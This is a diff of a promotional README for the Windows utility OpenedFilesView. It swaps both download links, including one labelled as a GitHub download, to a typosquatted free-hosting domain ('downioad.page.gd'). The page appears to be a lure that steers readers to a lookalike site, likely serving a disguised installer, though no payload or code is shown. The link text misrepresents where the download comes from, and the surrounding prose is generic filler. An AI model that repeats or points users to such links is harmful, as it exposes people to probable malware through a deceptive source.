@@ -2,7 +2,7 @@
 
 OpenedFilesView is a powerful utility designed for Windows desktop users to easily monitor and manage all open files on their system. This tool provides a user-friendly interface to view, analyze, and take action on files accessed by various processes, enhancing system administration and troubleshooting. With its robust features, OpenedFilesView becomes an essential addition to your software toolkit in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -84,6 +84,6 @@ A: Updates are released periodically to add new features, improve performance, a
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This README provides comprehensive information about OpenedFilesView, its features, and how to get started. For any further assistance, please refer to the documentation or reach out through the provided channels.
